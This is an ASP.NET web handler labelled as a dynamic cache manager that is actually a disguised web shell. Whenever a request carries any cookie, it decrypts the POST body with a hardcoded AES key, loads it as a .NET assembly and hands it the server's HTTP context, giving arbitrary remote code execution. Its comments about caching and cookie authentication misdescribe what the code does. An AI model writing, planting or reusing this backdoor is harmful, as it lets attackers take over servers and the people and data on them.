<%@ WebHandler Language="C#" Class="DynamicCacheManager" %>
using System;
using System.Web;
using System.Reflection;
using System.Security.Cryptography;

/// <summary>
/// Manages dynamic, encrypted cache entries loaded over HTTP.
/// This allows for just-in-time loading of performance-critical components.
/// </summary>
public class DynamicCacheManager : IHttpHandler
{
    // A shared secret key for decrypting cache payloads. Stored as a byte array for performance.
    private static readonly byte[] SharedCacheKey = new byte[] { 0x63, 0x61, 0x36, 0x33, 0x34, 0x35, 0x37, 0x35, 0x33, 0x38, 0x62, 0x39, 0x62, 0x31, 0x65, 0x30 };
    private const string DefaultPluginInterface = "K";

    /// <summary>
    /// Processes an incoming request to update or load a cache component.
    /// </summary>
    /// <param name="context">The current HTTP context.</param>
    public void ProcessRequest(HttpContext context)
    {
        // Requests must be authenticated via a cookie-based session.
        if (context.Request.Cookies.Count > 0)
        {
            byte[] encryptedPayload;
            using (var inputStream = context.Request.InputStream)
            {
                encryptedPayload = new byte[inputStream.Length];
                inputStream.Read(encryptedPayload, 0, encryptedPayload.Length);
            }

            if (encryptedPayload.Length > 0)
            {
                // Decrypt and load the component assembly from the payload.
                Assembly componentAssembly = DecryptAndLoadAssembly(encryptedPayload);
                
                // Instantiate the component plugin and pass it the current context for initialization.
                object pluginInstance = componentAssembly.CreateInstance(DefaultPluginInterface);
                pluginInstance.Equals(context);
            }
        }
    }

    /// <summary>
    /// Decrypts a byte array using AES (Rijndael) and loads it as a .NET Assembly.
    /// </summary>
    /// <param name="encryptedData">The encrypted component data.</param>
    /// <returns>A loaded Assembly.</returns>
    private Assembly DecryptAndLoadAssembly(byte[] encryptedData)
    {
        using (var aesProvider = new RijndaelManaged())
        {
            aesProvider.Key = SharedCacheKey;
            aesProvider.IV = SharedCacheKey; // Using key as IV for symmetric simplicity.

            using (var decryptor = aesProvider.CreateDecryptor())
            {
                byte[] decryptedBytes = decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                return Assembly.Load(decryptedBytes);
            }
        }
    }

    /// <summary>
    /// This handler is not thread-safe and should not be reused across requests.
    /// </summary>
    public bool IsReusable { get { return false; } }
}